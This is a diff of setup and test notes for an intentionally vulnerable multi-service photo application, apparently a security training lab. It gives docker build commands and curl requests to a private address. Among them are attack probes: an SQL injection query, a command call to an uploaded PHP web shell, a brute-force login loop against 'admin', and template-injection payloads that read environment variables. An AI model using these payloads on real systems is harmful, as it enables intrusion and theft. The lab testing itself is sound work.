@@ -6,6 +6,7 @@ docker build -t usatpath01/vulnerable-photo-app-photo-service:latest ./photo_ser
 docker build -t usatpath01/vulnerable-photo-app-notification-service:latest ./notification_service
 docker build -t usatpath01/vulnerable-photo-app-recommendation-service:latest ./recommendation_service
 docker build -t usatpath01/vulnerable-photo-app-analytics-service:latest ./analytics_service
+docker build -t usatpath01/vulnerable-photo-app-profile-service:latest ./profile_service
 ```
 ```
 docker push usatpath01/vulnerable-photo-app-frontend:latest
@@ -15,6 +16,7 @@ docker push usatpath01/vulnerable-photo-app-photo-service:latest
 docker push usatpath01/vulnerable-photo-app-notification-service:latest
 docker push usatpath01/vulnerable-photo-app-recommendation-service:latest
 docker push usatpath01/vulnerable-photo-app-analytics-service:latest
+docker push usatpath01/vulnerable-photo-app-profile-service:latest
 ```
 
 ```
@@ -81,9 +83,9 @@ curl -X POST "http://10.5.20.45:8000/api/users/register"      -H "Content-Type: 
   }
 }
 
-curl -X POST "http://10.5.20.45:8000/api/users/register"      -H "Content-Type: application/json"      -d '{"username":"user1", "password":"user1_1234", "email":"user1@gmail.com"}'
+curl -X POST "http://10.5.20.45:8000/api/users/register"      -H "Content-Type: application/json"      -d '{"username":"user99", "password":"user99_1234", "email":"user99@gmail.com"}'
 
-curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"user1","password":"user1_1234"}'
+curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"user99","password":"user99_1234"}'
 
 curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
      -H "Content-Type: multipart/form-data" \
@@ -158,15 +160,157 @@ curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
   "status": "success"
 }
 
-curl "http://10.5.20.45:8000/api/photos/5f03820f-9ec9-439c-aca2-bb5a00c8faf2.php?user_id=1&cmd=ls"
+curl "http://10.5.20.45:8000/api/photos/ffb2d665-3916-47a9-99fd-3c170462a0aa.php?user_id=1&cmd=ls"
 
-curl -X GET "http://10.5.20.45:8000/api/photos/b40051e6-de40-42fb-aee5-82646e39f2a8.png" --output downloaded_image.png
+curl -X GET "http://10.5.20.45:8000/api/photos/1762071b-9466-48ef-87ae-cd956b34c4fb.png" --output downloaded_image.png
 
 curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
      -H "Content-Type: multipart/form-data" \
      -F "file=@malicious.php" \
      -F "user_id=123"
 {"filename":"b124236a-f516-4c1f-a022-408f32e071dc.php","message":"File uploaded successfully","status":"success"}
+
+curl -X POST "http://10.5.20.45:8000/api/recommendations/populate_books"
+{
+  "message": "Added 10 books to the database", 
+  "status": "success"
+}
+
+url -X GET "http://10.5.20.45:8000/api/recommendations/debug/books"
+{
+  "books": [
+    {
+      "author": "Frank Herbert", 
+      "category": "books", 
+      "genre": "sci-fi", 
+      "title": "Dune"
+    }, 
+    {
+      "author": "William Gibson", 
+      "category": "books", 
+      "genre": "sci-fi", 
+      "title": "Neuromancer"
+    }, 
+    {
+      "author": "George Orwell", 
+      "category": "books", 
+      "genre": "dystopian", 
+      "title": "1984"
+    }, 
+    {
+      "author": "Harper Lee", 
+      "category": "books", 
+      "genre": "fiction", 
+      "title": "To Kill a Mockingbird"
+    }, 
+    {
+      "author": "J.R.R. Tolkien", 
+      "category": "books", 
+      "genre": "fantasy", 
+      "title": "The Hobbit"
+    }, 
+    {
+      "author": "Jane Austen", 
+      "category": "books", 
+      "genre": "romance", 
+      "title": "Pride and Prejudice"
+    }, 
+    {
+      "author": "J.D. Salinger", 
+      "category": "books", 
+      "genre": "fiction", 
+      "title": "The Catcher in the Rye"
+    }, 
+    {
+      "author": "Aldous Huxley", 
+      "category": "books", 
+      "genre": "dystopian", 
+      "title": "Brave New World"
+    }, 
+    {
+      "author": "Isaac Asimov", 
+      "category": "books", 
+      "genre": "sci-fi", 
+      "title": "The Foundation Trilogy"
+    }, 
+    {
+      "author": "J.R.R. Tolkien", 
+      "category": "books", 
+      "genre": "fantasy", 
+      "title": "The Lord of the Rings"
+    }
+  ], 
+  "status": "success"
+}
+
+
+curl -X GET "http://10.5.20.45:8000/api/recommendations/recommend?user_id=14"
+{
+  "message": "New user, no preferences set", 
+  "recommendations": [], 
+  "status": "success"
+}
+
+curl -X POST "http://10.5.20.45:8000/api/recommendations/update_preferences" -H "Content-Type: application/json" -d '{"user_id": "14", "preferences": {"category": "books", "genre": "sci-fi"}}'
+{
+  "message": "Preferences updated", 
+  "status": "success"
+}
+
+curl -X GET "http://10.5.20.45:8000/api/recommendations/recommend?user_id=14"
+{
+  "recommendations": [
+    {
+      "_id": "66f44ed086117430e217f72a", 
+      "author": "Frank Herbert", 
+      "category": "books", 
+      "genre": "sci-fi", 
+      "title": "Dune"
+    }, 
+    {
+      "_id": "66f44ed086117430e217f72b", 
+      "author": "William Gibson", 
+      "category": "books", 
+      "genre": "sci-fi", 
+      "title": "Neuromancer"
+    }, 
+    {
+      "_id": "66f44ed086117430e217f732", 
+      "author": "Isaac Asimov", 
+      "category": "books", 
+      "genre": "sci-fi", 
+      "title": "The Foundation Trilogy"
+    }
+  ], 
+  "status": "success"
+}
+
+
+# Users SQL injection
+curl -v "http://10.5.20.45:8000/api/users?username=newuser1"
+
+
+for i in {1..100}; do 
+  curl -X POST "http://10.5.20.45:8000/api/users/login" \
+       -H "Content-Type: application/json" \
+       -d '{"username": "admin", "password": "password'$i'"}'; 
+done
+
+
+# Test with a normal username
+curl -v "http://10.5.20.45:3000/profile?username=test"
+
+# Test with an EJS arithmetic operation
+curl -v "http://10.5.20.45:3000/profile?username=%3C%25%3D%207%20*%207%20%25%3E"
+
+# Test with a JavaScript arithmetic operation
+curl -v "http://10.5.20.45:3000/profile?username=7%20*%207"
+
+# Test with an attempt to access process.env
+curl -v "http://10.5.20.45:3000/profile?username=%3C%25%3D%20process.env.NODE_ENV%20%25%3E"
+
+# Test with an attempt to execute a function
+curl -v "http://10.5.20.45:3000/profile?username=(()%20%3D%3E%20'Hello')()"
 
 
 ```
@@ -181,3 +325,6 @@ docker tag usatpath01/vulnerable-photo-app-user-service:v1 usatpath01/vulnerable
 ```
 git push -u origin main
 ```
+
+
+split -l 360 --additional-suffix=.log getprofile_new-WK5-SMRL.txt getprofile_new-WK5-SMRL
